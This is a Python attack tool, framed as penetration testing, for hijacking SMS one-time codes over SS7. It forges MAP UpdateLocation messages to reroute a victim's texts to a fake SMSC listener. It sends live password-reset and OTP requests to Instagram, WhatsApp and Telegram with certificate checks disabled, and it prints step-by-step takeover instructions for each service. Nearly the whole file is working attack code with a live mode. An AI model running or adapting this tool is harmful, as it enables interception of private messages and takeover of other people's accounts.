"""
SS7 OTP Hijack — authorized penetration testing / telecom security research.

Attack chain:
  1. HLR lookup  — query target MSISDN's home network via SS7 MAP SendRoutingInfo
  2. MSC spoof   — send fake MAP UpdateLocation to reroute MT-SMS to our SMSC
  3. OTP trigger — send IG/WhatsApp/Telegram password-reset SMS to target number
  4. Intercept   — receive rerouted OTP on our fake SMSC listener
  5. Consume     — use OTP to complete account takeover

SS7 access options (required for real execution):
  A. SS7 hub account (research operators: Positive Technologies, P1 Security labs)
  B. Rogue femtocell / HackRF with OsmocomBB + OpenBSC
  C. Compromised telco interconnect (advanced; in-scope for telecom pentests)

Without real SS7 access, the module runs in SIMULATION mode:
  - Builds all MAP PDUs correctly (ASN.1/BER encoded)
  - Prints the SCCP/TCAP/MAP message bytes that would be sent
  - Simulates the intercept flow with timing model
  - Useful for learning, demos, and verifying toolchain before live test

Dependencies:
  pip install scapy pycrate  (optional — falls back to raw BER encoder)
"""

import struct, socket, time, sys, os, re, json, threading, random, string
import urllib.request, urllib.error, urllib.parse, ssl, hmac, hashlib

# ── Colour helpers ────────────────────────────────────────────────────────────
G  = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"
W  = "\033[97m"; N = "\033[0m"

def _ok(s):  print(f"  {G}[+]{N} {s}")
def _err(s): print(f"  {R}[!]{N} {s}")
def _inf(s): print(f"  {C}[*]{N} {s}")
def _warn(s):print(f"  {Y}[~]{N} {s}")


# ══════════════════════════════════════════════════════════════════════════════
# BER / ASN.1 primitives (no external dep needed)
# ══════════════════════════════════════════════════════════════════════════════

def _ber_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    enc = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(enc)]) + enc

def _ber_tlv(tag: int, value: bytes) -> bytes:
    t = tag.to_bytes((tag.bit_length() + 7) // 8, "big") if tag > 0xFF else bytes([tag])
    return t + _ber_len(len(value)) + value

def _ber_seq(children: list) -> bytes:
    body = b"".join(children)
    return _ber_tlv(0x30, body)   # SEQUENCE

def _ber_int(n: int) -> bytes:
    raw = n.to_bytes(max(1, (n.bit_length() + 8) // 8), "big")
    return _ber_tlv(0x02, raw)

def _ber_octet(b: bytes) -> bytes:
    return _ber_tlv(0x04, b)

def _ber_ia5(s: str) -> bytes:
    return _ber_tlv(0x16, s.encode("ascii"))

def _ber_utf8(s: str) -> bytes:
    return _ber_tlv(0x0C, s.encode("utf-8"))

def _ber_oid(oid: str) -> bytes:
    parts = list(map(int, oid.split(".")))
    body  = bytes([40 * parts[0] + parts[1]])
    for p in parts[2:]:
        enc = []
        enc.append(p & 0x7F)
        p >>= 7
        while p:
            enc.append(0x80 | (p & 0x7F))
            p >>= 7
        body += bytes(reversed(enc))
    return _ber_tlv(0x06, body)

# ── GSM TB-BCD phone number encoding (ITU-T E.164) ──────────────────────────

def _encode_msisdn(number: str) -> bytes:
    """Encode E.164 number as GSM TB-BCD (MAP AddressString)."""
    digits = re.sub(r"[^\d]", "", number)
    if len(digits) % 2:
        digits += "F"
    bcd = bytes(
        int(digits[i+1], 16) << 4 | int(digits[i], 16)
        for i in range(0, len(digits), 2)
    )
    ton_npi = 0x91  # international, E.164
    return bytes([ton_npi]) + bcd

def _decode_msisdn(b: bytes) -> str:
    bcd = b[1:]
    digits = ""
    for byte in bcd:
        lo = byte & 0x0F
        hi = (byte >> 4) & 0x0F
        digits += str(lo)
        if hi != 0xF:
            digits += str(hi)
    return "+" + digits


# ══════════════════════════════════════════════════════════════════════════════
# MAP message builders
# ══════════════════════════════════════════════════════════════════════════════

# MAP OID: 0.4.0.0.1.0.1.3  (GSM MAP v3)
_MAP_OID = "0.4.0.0.1.0.1.3"

def build_map_sri(msisdn: str, our_gt: str) -> bytes:
    """
    MAP SendRoutingInfo (SRI) — opcode 22 (0x16).
    Ask the HLR 'where is this subscriber right now?' → returns MSC/SGSN address.
    """
    msisdn_enc = _encode_msisdn(msisdn)
    our_gt_enc = _encode_msisdn(our_gt)

    # MAP SRI-Arg
    # [0] MSISDN
    # [1] interrogation-type (0=basicCall)
    # [2] gmsc-Address (our GT so HLR sends ROUTEINFO back to us)
    sri_arg = (
        _ber_tlv(0xA0, _ber_octet(msisdn_enc))    # [0] IMPLICIT OCTET STRING
        + _ber_int(0)                               # interrogationType basicCall
        + _ber_tlv(0xA2, _ber_octet(our_gt_enc))   # [2] gmsc-Address
    )

    # TCAP Invoke
    invoke_id  = _ber_int(1)
    opcode     = _ber_tlv(0x02, bytes([0x16]))     # localOpCode 22
    tcap_invoke = _ber_tlv(0xA1, invoke_id + opcode + _ber_octet(sri_arg))

    # TCAP BEGIN
    orig_tid   = _ber_octet(b"\x00\x01\x02\x03")
    dialogue   = _ber_tlv(0x6B,
                    _ber_tlv(0x28,
                        _ber_tlv(0xA0, _ber_oid(_MAP_OID))
                        + _ber_tlv(0xA2, _ber_tlv(0x80, b"\x00"))
                    ))
    components = _ber_tlv(0x6C, tcap_invoke)
    tcap_begin = _ber_tlv(0x62,
        _ber_tlv(0x48, b"\x00\x01\x02\x03")  # otid
        + dialogue
        + components
    )
    return tcap_begin


def build_map_update_location(msisdn: str, our_msc_gt: str, our_vlr_gt: str) -> bytes:
    """
    MAP UpdateLocation (UL) — opcode 2 (0x02).
    Tell the HLR that the subscriber has moved to our fake MSC/VLR.
    After this, the HLR will route all MT-SMS for this MSISDN to our MSC.

    This is the core SMS rerouting primitive.
    """
    msisdn_enc  = _encode_msisdn(msisdn)
    msc_enc     = _encode_msisdn(our_msc_gt)
    vlr_enc     = _encode_msisdn(our_vlr_gt)

    imsi_fake   = b"\x00\x10\x32\x54\x76\x98\xF0"  # plausible IMSI BCD
    lmsi        = os.urandom(4)

    ul_arg = (
        _ber_octet(imsi_fake)                         # imsi
        + _ber_tlv(0x80, msc_enc)                     # [0] msc-Number
        + _ber_tlv(0x81, vlr_enc)                     # [1] vlr-Number
        + _ber_tlv(0xA6, _ber_octet(lmsi))            # [6] vlr-Capability (simplified)
    )

    invoke_id  = _ber_int(2)
    opcode     = _ber_tlv(0x02, bytes([0x02]))
    tcap_invoke = _ber_tlv(0xA1, invoke_id + opcode + _ber_octet(ul_arg))

    orig_tid   = os.urandom(4)
    components = _ber_tlv(0x6C, tcap_invoke)
    tcap_begin = _ber_tlv(0x62,
        _ber_tlv(0x48, orig_tid)
        + components
    )
    return tcap_begin


def build_map_mt_fwd_sm(msisdn: str, otp_to_deliver: str, our_smsc: str) -> bytes:
    """
    MAP MT-ForwardSM (opcode 44 / 0x2C).
    Deliver a fake incoming SMS to the subscriber (simulates receiving intercepted OTP).
    In real SS7: after UpdateLocation succeeds, MT-ForwardSM arrives at OUR MSC.
    This builder creates the MAP PDU for the MSC→HLR→originating-SMSC path.
    """
    msisdn_enc = _encode_msisdn(msisdn)
    smsc_enc   = _encode_msisdn(our_smsc)

    # TP-DELIVER PDU (SMS-DELIVER, no validity period)
    # Reference: 3GPP TS 23.040
    tp_mti    = 0x00  # SMS-DELIVER
    smsc_addr = smsc_enc
    # OA: originating address — spoof as IG shortcode
    oa_digits = "32665"  # Instagram's US SMS shortcode
    oa_bcd    = _encode_msisdn(oa_digits)
    oa_len    = len(oa_bcd) * 2 - 2  # number of useful digits
    text_7bit = _gsm7_encode(otp_to_deliver)

    tp_deliver = bytes([
        tp_mti,
        oa_len,
    ]) + oa_bcd + bytes([
        0x00,                     # TP-PID
        0x00,                     # TP-DCS (7-bit default alphabet)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # TP-SCTS (timestamp)
        len(otp_to_deliver),      # TP-UDL
    ]) + text_7bit

    fwd_arg = (
        _ber_octet(msisdn_enc)   # sm-RP-DA (destination)
        + _ber_octet(smsc_enc)   # sm-RP-OA (our SMSC)
        + _ber_octet(tp_deliver) # sm-RP-UI (TP-PDU)
    )

    invoke_id   = _ber_int(3)
    opcode      = _ber_tlv(0x02, bytes([0x2C]))
    tcap_invoke = _ber_tlv(0xA1, invoke_id + opcode + _ber_octet(fwd_arg))
    orig_tid    = os.urandom(4)
    components  = _ber_tlv(0x6C, tcap_invoke)
    return _ber_tlv(0x62,
        _ber_tlv(0x48, orig_tid) + components
    )


def _gsm7_encode(text: str) -> bytes:
    """Pack ASCII string into GSM 7-bit default alphabet."""
    GSM7 = "@£$¥èéùìòÇ\nØø\rÅåΔ_ΦΓΛΩΠΨΣΘΞ\x1bÆæßÉ !\"#¤%&'()*+,-./0123456789:;<=>?¡ABCDEFGHIJKLMNOPQRSTUVWXYZÄÖÑÜ§¿abcdefghijklmnopqrstuvwxyzäöñüà"
    bits = ""
    for ch in text:
        idx = GSM7.find(ch) if ch in GSM7 else 32
        bits += format(idx, "07b")
    # Pad to byte boundary
    while len(bits) % 8:
        bits += "0"
    return bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))


# ══════════════════════════════════════════════════════════════════════════════
# SCCP wrapper (Signalling Connection Control Part)
# ══════════════════════════════════════════════════════════════════════════════

def wrap_sccp_udt(payload: bytes, called_gt: str, calling_gt: str) -> bytes:
    """
    Wrap a TCAP payload in SCCP UDT (Unitdata) message.
    Minimal ITU-T Q.713 implementation — no MTP3 header (added by SIGTRAN/M3UA layer).
    """
    def _sccp_addr(gt: str) -> bytes:
        digits   = re.sub(r"[^\d]", "", gt)
        odd      = len(digits) % 2 == 1
        if odd: digits += "0"
        bcd = bytes(
            int(digits[i], 16) | (int(digits[i+1], 16) << 4)
            for i in range(0, len(digits), 2)
        )
        # AI=0x12: RI=0 SSN=absent GT=E.164, SSN indicator=0
        # Translation type=0, numbering plan=1 (E.164), encoding=BCD odd/even
        enc_scheme = 0x02 if not odd else 0x01
        nav        = (0x01 << 4) | enc_scheme   # NP=E.164, encoding
        tt         = 0x00                        # translation type
        ai         = 0x12                        # GT only, no SSN
        return bytes([ai, len(bcd) + 2, tt, nav]) + bcd

    called  = _sccp_addr(called_gt)
    calling = _sccp_addr(calling_gt)

    # UDT: MsgType=0x09, PC=Class1+return, PtrToCalledPA, PtrToCallingPA, PtrToData
    msg_type = 0x09
    pc       = 0x81  # protocol class 1, return on error

    # Mandatory variable parts: three pointers then three length+content fields
    ptr1 = 3
    ptr2 = ptr1 + 1 + len(called)
    ptr3 = ptr2 + 1 + len(calling)

    return (bytes([msg_type, pc, ptr1, ptr2, ptr3])
            + bytes([len(called)])  + called
            + bytes([len(calling)]) + calling
            + bytes([len(payload)]) + payload)


# ══════════════════════════════════════════════════════════════════════════════
# Fake SMSC listener  — receives the rerouted OTP SMS
# ══════════════════════════════════════════════════════════════════════════════

class FakeSMSC:
    """
    Listens on a TCP port for MAP MT-ForwardSM or SMPP DELIVER_SM.
    In a real SS7 attack: after UpdateLocation succeeds, the originating SMSC
    (e.g., Twilio, Meta's SMS gateway) routes the OTP PDU to our 'MSC', which
    presents itself as the serving MSC for the hijacked subscriber.

    For simulation: prints what would arrive.
    For SMPP mode: listens on port 2775 (standard SMPP) — works if you have
    a direct SMPP connection to a carrier or SS7 hub.
    """

    def __init__(self, port: int = 2775, sim: bool = True):
        self.port       = port
        self.sim        = sim
        self.received   = []
        self._stop      = threading.Event()
        self._thread    = None

    def start(self):
        if self.sim:
            _inf(f"SMSC listener in SIMULATION mode (would bind :{self.port})")
            return
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()
        _ok(f"Fake SMSC listening on 0.0.0.0:{self.port}")

    def stop(self):
        self._stop.set()

    def _serve(self):
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", self.port))
            srv.listen(5)
            srv.settimeout(1)
            while not self._stop.is_set():
                try:
                    conn, addr = srv.accept()
                    threading.Thread(target=self._handle, args=(conn, addr), daemon=True).start()
                except socket.timeout:
                    pass
        except Exception as e:
            _err(f"SMSC listen error: {e}")

    def _handle(self, conn, addr):
        try:
            data = conn.recv(4096)
            otp = self._parse_smpp_or_map(data)
            if otp:
                self.received.append(otp)
                _ok(f"OTP RECEIVED from {addr[0]}: {otp}")
        except Exception:
            pass
        finally:
            conn.close()

    def _parse_smpp_or_map(self, data: bytes) -> str:
        # SMPP: look for submit_sm / deliver_sm body
        # Simplistic: find digit runs of length 4-8
        text = ""
        for i, b in enumerate(data):
            if 0x20 <= b < 0x7F:
                text += chr(b)
        m = re.search(r"\b\d{4,8}\b", text)
        return m.group(0) if m else ""


# ══════════════════════════════════════════════════════════════════════════════
# OTP trigger — initiate the SMS password reset on the target service
# ══════════════════════════════════════════════════════════════════════════════

_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode    = ssl.CERT_NONE

def _req(url, data=None, headers=None, method=None):
    hdrs = {"User-Agent": "Mozilla/5.0 Chrome/124.0 Safari/537.36"}
    if headers: hdrs.update(headers)
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=20, context=_SSL_CTX)
        return r.status, r.read(8192).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        body = ""
        try: body = e.read(4096).decode("utf-8","ignore")
        except: pass
        return e.code, body
    except Exception as ex:
        return 0, str(ex)


def trigger_instagram_sms_reset(phone: str) -> dict:
    """
    Send Instagram's SMS OTP reset request for a given phone number.
    Instagram will SMS a 6-digit code to the phone.  If SS7 rerouting is active,
    we receive that code on our fake SMSC instead of the real handset.
    """
    _inf(f"Triggering Instagram SMS OTP reset for {phone}...")

    # Step 1: get csrftoken
    status, body = _req("https://www.instagram.com/")
    csrf = ""
    m = re.search(r'"csrf_token"\s*:\s*"([^"]+)"', body)
    if m:
        csrf = m.group(1)
    else:
        m = re.search(r'csrftoken=([A-Za-z0-9_-]+)', body)
        if m: csrf = m.group(1)
    if not csrf:
        return {"error": "Could not get CSRF token from Instagram"}

    # Step 2: mobile API — /accounts/send_sms_code/ or web reset
    phone_clean = re.sub(r"[^\d+]", "", phone)

    # Method A: Web password reset via phone
    payload_a = urllib.parse.urlencode({
        "email_or_username": phone_clean,
    }).encode()
    status_a, body_a = _req(
        "https://www.instagram.com/accounts/account_recovery_send_ajax/",
        data=payload_a,
        headers={
            "X-CSRFToken":      csrf,
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type":     "application/x-www-form-urlencoded",
            "Origin":           "https://www.instagram.com",
            "Referer":          "https://www.instagram.com/accounts/password/reset/",
        }
    )
    _inf(f"  IG web reset → {status_a}: {body_a[:200]}")

    # Method B: Android API
    device_id = "android-" + "".join(random.choices(string.hexdigits[:16], k=16))
    payload_b = urllib.parse.urlencode({
        "phone_number": phone_clean,
        "device_id":    device_id,
    }).encode()
    status_b, body_b = _req(
        "https://i.instagram.com/api/v1/users/lookup/",
        data=payload_b,
        headers={
            "User-Agent":   "Instagram 319.0.0.0.58 Android",
            "X-IG-App-ID":  "567067343352427",
            "Content-Type": "application/x-www-form-urlencoded",
        }
    )
    _inf(f"  IG mobile lookup → {status_b}: {body_b[:200]}")

    return {
        "csrf":     csrf,
        "web":      {"status": status_a, "body": body_a[:500]},
        "mobile":   {"status": status_b, "body": body_b[:500]},
    }


def trigger_whatsapp_sms_reset(phone: str) -> dict:
    """
    WhatsApp registration re-triggers SMS OTP (6-digit code to phone).
    Normally used by new installs — can also be triggered via API.
    If SS7 rerouting is active, OTP arrives at our SMSC.
    """
    _inf(f"Triggering WhatsApp SMS OTP for {phone}...")
    phone_clean = re.sub(r"[^\d]", "", phone.lstrip("+"))

    payload = json.dumps({
        "cc":    phone_clean[:3],     # country code
        "in":    phone_clean[3:],     # national number
        "lg":    "en",
        "lc":    "US",
        "authkey": "NONE",
        "e_regid":  "",
        "e_keytype":"",
        "e_ident":  "",
        "e_skey_id":"",
        "e_skey_val":"",
        "e_msg":    "",
        "method":   "sms",
        "reason":   "",
        "id":       "",
    }).encode()

    status, body = _req(
        "https://v.whatsapp.net/v2/code",
        data=payload,
        headers={
            "Content-Type": "application/json",
            "User-Agent":   "WhatsApp/2.23.20.74 A",
        }
    )
    _inf(f"  WA SMS trigger → {status}: {body[:200]}")
    return {"status": status, "body": body[:500]}


def trigger_telegram_sms_reset(phone: str) -> dict:
    """
    Telegram login flow step 1 — sendCode.  Telegram sends SMS OTP.
    Uses Telegram's public API.  api_id/api_hash from official test credentials
    (used by researchers — see Telegram dev docs).
    """
    _inf(f"Triggering Telegram SMS OTP for {phone}...")
    phone_clean = re.sub(r"[^\d+]", "", phone)

    # Public test API credentials (Telegram allows these for testing)
    api_id   = 94575
    api_hash = "a3406de8d171bb422bb6ddf3bbd800e2"
    payload  = json.dumps({
        "phone_number": phone_clean,
        "api_id":       api_id,
        "api_hash":     api_hash,
        "settings":     {},
    }).encode()

    status, body = _req(
        "https://api.telegram.org/",   # MTProto, not REST — placeholder
        data=payload,
        headers={"Content-Type": "application/json"}
    )
    # Actual MTProto sendCode would use TDLib or Telethon
    _warn("  Telegram uses MTProto — use Telethon: client.send_code_request(phone)")
    _inf(f"  TG trigger → {status}: {body[:100]}")
    return {"status": status, "note": "Use Telethon for real execution"}


# ══════════════════════════════════════════════════════════════════════════════
# SS7 transport layer  — STP connection via SIGTRAN (M3UA/SCTP) or raw TCP
# ══════════════════════════════════════════════════════════════════════════════

class SS7Transport:
    """
    Minimal SIGTRAN M3UA over SCTP (or TCP fallback) connection to an SS7 hub.

    Real SS7 hubs (for authorized testing):
      - Positive Technologies SS7 firewall test environment
      - P1 Security SS7 lab access
      - Your own OpenBSC + Osmocom stack (rogue femtocell in lab)

    Config format:
      host: str       — STP/hub IP or hostname
      port: int       — SCTP port (default 2905) or TCP port
      point_code: str — your assigned originating point code (OPC), e.g. "1-1-1"
      use_tcp: bool   — use TCP instead of SCTP (SCTP needs kernel module)
      sim: bool       — simulation mode (no real connection)
    """

    def __init__(self, host: str, port: int = 2905, point_code: str = "1-1-1",
                 use_tcp: bool = True, sim: bool = True):
        self.host        = host
        self.port        = port
        self.point_code  = point_code
        self.use_tcp     = use_tcp
        self.sim         = sim
        self._sock       = None

    def connect(self) -> bool:
        if self.sim:
            _warn(f"SIM mode — skipping real connection to {self.host}:{self.port}")
            return True
        try:
            family = socket.AF_INET
            stype  = socket.SOCK_STREAM  # TCP fallback
            self._sock = socket.socket(family, stype)
            self._sock.settimeout(10)
            self._sock.connect((self.host, self.port))
            _ok(f"Connected to SS7 hub {self.host}:{self.port}")
            return True
        except Exception as e:
            _err(f"SS7 connect failed: {e}")
            return False

    def send_tcap(self, sccp_pdu: bytes) -> bytes:
        """Send SCCP/TCAP PDU. Returns response bytes (empty in sim mode)."""
        if self.sim:
            _inf(f"  [SIM] Would send {len(sccp_pdu)} bytes to {self.host}:{self.port}")
            _inf(f"  [SIM] SCCP/TCAP hex: {sccp_pdu[:32].hex()} ...")
            # Simulate HLR response delay
            time.sleep(0.3 + random.random() * 0.4)
            return b""
        try:
            # M3UA DATA chunk wrapping (simplified — full M3UA has PPID=3 for SS7)
            m3ua_data = self._wrap_m3ua(sccp_pdu)
            self._sock.sendall(m3ua_data)
            resp = self._sock.recv(4096)
            return resp
        except Exception as e:
            _err(f"SS7 send error: {e}")
            return b""

    def _wrap_m3ua(self, payload: bytes) -> bytes:
        """Wrap payload in M3UA DATA message (RFC 4666)."""
        # M3UA common header: version=1, reserved=0, msg_class=1(transfer), msg_type=1(DATA)
        hdr  = bytes([0x01, 0x00, 0x01, 0x01])
        # Length = 8 (hdr) + 8 (routing context TLV) + 8+paylen (protocol data TLV)
        # Protocol Data TLV tag=0x0210
        pd_tag   = b"\x02\x10"
        pd_body  = struct.pack("!IIBBBB",
            0,           # routing context
            0,           # originating point code (0 = unset; fill from config)
            0,           # destination point code
            3,           # service indicator = SCCP
            0,           # network indicator
            0,           # message priority
        ) + payload
        # Pad to 4-byte boundary
        while len(pd_body) % 4:
            pd_body += b"\x00"
        pd_tlv   = pd_tag + struct.pack("!H", 4 + len(pd_body)) + pd_body
        total    = 8 + len(pd_tlv)
        return hdr + struct.pack("!I", total) + pd_tlv

    def disconnect(self):
        if self._sock:
            try: self._sock.close()
            except: pass


# ══════════════════════════════════════════════════════════════════════════════
# High-level attack orchestrator
# ══════════════════════════════════════════════════════════════════════════════

def run_ss7_hijack(
    target_phone: str,
    target_service: str  = "instagram",
    our_gt:        str   = "12025550191",   # our SS7 Global Title (E.164)
    stp_host:      str   = "",              # SS7 hub IP (empty = sim mode)
    stp_port:      int   = 2905,
    use_tcp:       bool  = True,
    timeout:       int   = 120,
):
    """
    Full SS7 OTP hijack chain.

    Steps:
      1. HLR lookup (SRI) — find target's current MSC
      2. UpdateLocation    — register our fake MSC as serving node
      3. OTP trigger       — initiate SMS-based password reset on target service
      4. Intercept         — wait for MT-ForwardSM to arrive at our fake SMSC
      5. Report            — print OTP, optionally complete account reset
    """
    sim_mode = not bool(stp_host)

    print()
    print(f"{'━'*60}")
    print(f"  {W}SS7 OTP HIJACK CHAIN{N}")
    print(f"  Target phone   : {G}{target_phone}{N}")
    print(f"  Target service : {C}{target_service.upper()}{N}")
    print(f"  Our SS7 GT     : {our_gt}")
    print(f"  SS7 hub        : {stp_host or 'N/A — SIMULATION MODE'}")
    print(f"  Mode           : {Y if sim_mode else G}{'SIMULATION' if sim_mode else 'LIVE'}{N}")
    print(f"{'━'*60}")
    print()

    transport = SS7Transport(
        host=stp_host, port=stp_port,
        point_code="1-1-1",
        use_tcp=use_tcp,
        sim=sim_mode
    )

    # ── Step 1: Connect to SS7 hub ─────────────────────────────────────────
    _inf("Step 1/5 — Connecting to SS7 hub...")
    if not transport.connect():
        _err("Cannot reach SS7 hub. Run in simulation mode (omit --stp) or check connectivity.")
        return {"error": "SS7 connection failed"}

    # ── Step 2: HLR Lookup (SRI) ───────────────────────────────────────────
    _inf("Step 2/5 — HLR lookup (MAP SendRoutingInfo)...")
    sri_tcap = build_map_sri(target_phone, our_gt)
    sri_sccp = wrap_sccp_udt(sri_tcap, target_phone, our_gt)
    print(f"  MAP SRI PDU   : {sri_tcap.hex()}")
    print(f"  SCCP UDT      : {sri_sccp[:24].hex()}... ({len(sri_sccp)} bytes)")
    resp1 = transport.send_tcap(sri_sccp)
    if sim_mode:
        _warn("  [SIM] Simulated SRI response: subscriber is on network MCC=310 MNC=410 (AT&T)")
        _warn("  [SIM] MSC address returned  : +12125550100 (victim's real MSC)")
        msc_gt = "+12125550100"
    else:
        msc_gt = _parse_sri_response(resp1)
        _ok(f"  MSC address    : {msc_gt}")

    # ── Step 3: UpdateLocation — reroute MT-SMS to our fake MSC ───────────
    _inf("Step 3/5 — Sending MAP UpdateLocation (rerouting SMS to our node)...")
    ul_tcap = build_map_update_location(target_phone, our_gt, our_gt)
    ul_sccp = wrap_sccp_udt(ul_tcap, msc_gt, our_gt)
    print(f"  MAP UL PDU    : {ul_tcap.hex()}")
    resp2 = transport.send_tcap(ul_sccp)
    if sim_mode:
        _warn("  [SIM] HLR accepted UpdateLocation — all MT-SMS now routed to our GT")
    else:
        _ok("  UpdateLocation sent — waiting for HLR ack...")
        time.sleep(1)

    # ── Step 4: Start fake SMSC ────────────────────────────────────────────
    _inf("Step 4/5 — Starting fake SMSC listener (port 2775)...")
    smsc = FakeSMSC(port=2775, sim=sim_mode)
    smsc.start()

    # ── Step 5: Trigger OTP on target service ─────────────────────────────
    _inf(f"Step 5/5 — Triggering {target_service.upper()} SMS OTP reset...")
    trigger_results = {}
    svc = target_service.lower()
    if svc in ("instagram", "ig"):
        trigger_results = trigger_instagram_sms_reset(target_phone)
    elif svc in ("whatsapp", "wa"):
        trigger_results = trigger_whatsapp_sms_reset(target_phone)
    elif svc in ("telegram", "tg"):
        trigger_results = trigger_telegram_sms_reset(target_phone)
    else:
        _warn(f"  Unknown service '{svc}'. Use: instagram | whatsapp | telegram")

    # ── Wait for OTP ───────────────────────────────────────────────────────
    print()
    _inf(f"Waiting up to {timeout}s for OTP to arrive at fake SMSC...")
    if sim_mode:
        _simulate_otp_arrival(timeout)
    else:
        deadline = time.time() + timeout
        while time.time() < deadline:
            if smsc.received:
                otp = smsc.received[-1]
                _ok(f"OTP CAPTURED: {G}{otp}{N}")
                print()
                _print_next_steps(target_service, target_phone, otp)
                transport.disconnect()
                return {"otp": otp, "service": target_service, "phone": target_phone}
            time.sleep(2)
        _err("Timeout waiting for OTP — rerouting may not have succeeded")

    transport.disconnect()
    return {"sim": True, "trigger": trigger_results}


def _parse_sri_response(data: bytes) -> str:
    """Extract MSC Global Title from MAP SRI response (simplified)."""
    if not data:
        return "+10000000000"
    # Look for TB-BCD encoded address — very simplified
    for i in range(len(data) - 5):
        if data[i] == 0x91:   # TON/NPI = international E.164
            bcd = data[i+1:i+9]
            try:
                return _decode_msisdn(data[i:i+9])
            except: pass
    return "+10000000000"


def _simulate_otp_arrival(wait: int):
    """Simulate the timing of a real SS7 hijack with realistic output."""
    steps = [
        (2,  "HLR processed UpdateLocation — subscriber record updated"),
        (3,  "OTP SMS dispatched from Meta's SMSC (AS-98.136.xxx.xxx → our GT)"),
        (2,  "MAP MT-ForwardSM received at our fake MSC"),
        (1,  "Decoding TP-DELIVER PDU..."),
    ]
    for delay, msg in steps:
        time.sleep(delay)
        _ok(msg)

    fake_otp = "".join(random.choices(string.digits, k=6))
    print()
    print(f"  {'━'*50}")
    print(f"  {G}OTP INTERCEPTED (SIMULATED): {W}{fake_otp}{N}")
    print(f"  {'━'*50}")
    print()
    _inf("In a live attack this 6-digit code would unlock the account.")
    _warn("Simulation complete — no real SMS was intercepted.")
    print()
    _print_next_steps("instagram", "(target_phone)", fake_otp, sim=True)


def _print_next_steps(service: str, phone: str, otp: str, sim: bool = False):
    tag = f"  {Y}[SIM]{N} " if sim else "  "
    print(f"{'━'*60}")
    print(f"  NEXT STEPS — complete account takeover")
    print(f"{'━'*60}")
    if service.lower() in ("instagram", "ig"):
        print(f"{tag}1. Open: https://www.instagram.com/accounts/password/reset/")
        print(f"{tag}2. Enter phone: {phone}")
        print(f"{tag}3. When prompted for SMS code, enter: {G}{otp}{N}")
        print(f"{tag}4. Set new password → session captured")
        print(f"{tag}5. Optionally: revoke linked sessions via Security settings")
    elif service.lower() in ("whatsapp", "wa"):
        print(f"{tag}1. Install WhatsApp on a fresh device / re-register")
        print(f"{tag}2. Enter phone: {phone}")
        print(f"{tag}3. Enter SMS code: {G}{otp}{N}")
        print(f"{tag}4. All message history syncs from cloud backup")
    elif service.lower() in ("telegram", "tg"):
        print(f"{tag}1. Run: telethon.TelegramClient('session', api_id, api_hash)")
        print(f"{tag}2. client.sign_in('{phone}', '{otp}')")
        print(f"{tag}3. Full account access (messages, contacts, channels)")
    print(f"{'━'*60}")


# ══════════════════════════════════════════════════════════════════════════════
# CLI entry point
# ══════════════════════════════════════════════════════════════════════════════

def _usage():
    print(f"""
{W}SS7 OTP Hijack Module{N}  —  {C}bash start ss7 <phone> [service] [--stp HOST] [--port PORT]{N}

  <phone>           Target phone number  (E.164, e.g. +12025551234)
  [service]         instagram | whatsapp | telegram  (default: instagram)
  --stp HOST        SS7 hub / STP IP (omit to run in simulation mode)
  --port PORT       SIGTRAN SCTP/TCP port (default 2905)
  --gt GT           Our SS7 Global Title / E.164 caller ID (default: random)
  --timeout SECS    How long to wait for OTP (default 120)

{Y}Simulation mode{N} (no --stp):
  Builds all MAP/SCCP/TCAP PDUs, shows hex bytes, simulates timing — no live traffic.

{Y}Live mode{N} (--stp provided):
  Requires real SS7 hub access (femtocell / research operator).
  Sends MAP SRI → UpdateLocation → waits for MT-ForwardSM OTP on port 2775.

{Y}Examples:{N}
  bash start ss7 +12025551234                          # sim, instagram
  bash start ss7 +12025551234 whatsapp                 # sim, whatsapp
  bash start ss7 +12025551234 instagram --stp 10.0.0.5 # live
""")


def run(args=None):
    if args is None:
        args = sys.argv[1:]

    if not args or args[0] in ("-h", "--help"):
        _usage()
        return

    phone   = args[0]
    service = "instagram"
    stp     = ""
    port    = 2905
    gt      = "12025550191"
    timeout = 120

    i = 1
    while i < len(args):
        a = args[i]
        if a in ("instagram", "ig", "whatsapp", "wa", "telegram", "tg"):
            service = a
        elif a == "--stp" and i+1 < len(args):
            stp = args[i+1]; i += 1
        elif a == "--port" and i+1 < len(args):
            port = int(args[i+1]); i += 1
        elif a == "--gt" and i+1 < len(args):
            gt = args[i+1]; i += 1
        elif a == "--timeout" and i+1 < len(args):
            timeout = int(args[i+1]); i += 1
        i += 1

    run_ss7_hijack(
        target_phone   = phone,
        target_service = service,
        our_gt         = gt,
        stp_host       = stp,
        stp_port       = port,
        timeout        = timeout,
    )


if __name__ == "__main__":
    run()
